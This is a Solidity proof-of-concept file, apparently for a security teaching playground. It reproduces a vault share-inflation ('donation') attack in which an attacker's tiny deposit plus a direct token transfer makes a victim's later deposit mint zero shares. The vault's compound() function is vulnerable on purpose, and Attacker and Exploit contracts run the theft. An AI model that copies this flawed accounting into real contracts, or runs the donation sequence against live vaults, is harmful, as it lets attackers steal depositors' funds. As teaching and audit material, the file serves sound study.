// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Clave Clagg — aToken donation inflation (Cantina, December 2024)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _compoundAccounting sets totalLiquidity to aToken.balanceOf.
    A 1 wei deposit, a 100 token donation, and compound() make the next
    10 token deposit mint 0 shares. The attacker's 1 share then withdraws
    the donation and the victim's 10 tokens. Net profit is 10 tokens. */

contract AToken {
    string public symbol = "aASSET";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }

    function transferFrom(address from, address to, uint256 amount) external {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract ClaggVault {
    struct PoolInfo {
        uint256 totalLiquidity;
        uint256 totalSupply;
    }

    AToken public token;
    PoolInfo public poolInfo;
    mapping(address => uint256) public sharesOf;

    constructor(AToken token_) {
        token = token_;
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        token.transferFrom(msg.sender, address(this), assets);
        if (poolInfo.totalSupply == 0) {
            shares = assets;
            poolInfo.totalLiquidity = assets;
        } else {
            shares = assets * poolInfo.totalSupply / poolInfo.totalLiquidity;
            poolInfo.totalLiquidity += assets;
        }
        poolInfo.totalSupply += shares;
        sharesOf[msg.sender] += shares;
    }

    function compound() external {
        poolInfo.totalLiquidity = token.balanceOf(address(this)); // @> VULN: a direct aToken donation inflates totalLiquidity
        // FIX: measure only assets minted by deposit, or mint dead shares on the first deposit
    }

    function withdraw(uint256 shares) external returns (uint256 assets) {
        require(sharesOf[msg.sender] >= shares && shares > 0, "shares");
        assets = shares * poolInfo.totalLiquidity / poolInfo.totalSupply;
        sharesOf[msg.sender] -= shares;
        poolInfo.totalSupply -= shares;
        poolInfo.totalLiquidity -= assets;
        token.transfer(msg.sender, assets);
    }
}

contract Victim {
    function deposit(ClaggVault vault) external {
        vault.deposit(10 ether);
    }
}

contract Attacker {
    function attack(ClaggVault vault, AToken token, Victim victim) external {
        vault.deposit(1);
        token.transfer(address(vault), 100 ether);
        vault.compound();
        victim.deposit(vault);
        vault.withdraw(1);
    }
}

contract Exploit {
    AToken public token; // CREATE nonce 1
    ClaggVault public vault; // CREATE nonce 2
    Attacker public attacker; // CREATE nonce 3
    Victim public victim; // CREATE nonce 4

    constructor() {
        token = new AToken();
        vault = new ClaggVault(token);
        attacker = new Attacker();
        victim = new Victim();
        token.mint(address(attacker), 100 ether + 1);
        token.mint(address(victim), 10 ether);
    }

    function run() external {
        attacker.attack(vault, token, victim);
        require(vault.sharesOf(address(victim)) == 0, "victim shares");
        require(token.balanceOf(address(victim)) == 0, "victim tokens");
        require(token.balanceOf(address(attacker)) == 110 ether + 1, "attacker end");
    }
}
